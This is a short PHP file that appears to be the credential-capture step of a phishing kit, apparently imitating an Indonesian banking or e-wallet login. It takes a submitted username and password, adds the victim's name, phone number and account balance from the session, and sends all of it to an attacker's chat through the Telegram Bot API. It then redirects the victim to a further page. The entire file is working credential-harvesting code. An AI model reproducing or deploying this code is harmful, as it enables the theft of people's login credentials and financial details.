<?php
include "telegram.php";
session_start();

$username = $_POST['username'];
$pass = $_POST['pass'];

$_SESSION['username'] = $username;
$_SESSION['pass'] = $pass;

$nama = $_SESSION['nama'];
$nomor = $_SESSION['nomor'];
$saldo = $_SESSION['saldo'];

$message = "
✧━━━━━━[ 🅃🄴🅁🄸🄼🄰🄺🄰🅂🄸🄷 ]━━━━━━✧

- 𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ".$nama."
- 𝗡𝗼 𝗛𝗽 : ".$nomor."
- 𝗦𝗮𝗹𝗱𝗼 : ".$saldo."
- 𝑈𝑠𝑒𝑟𝑛𝑎𝑚𝑒 : ".$username."
- 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ".$pass."

 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../konf.php');
?>
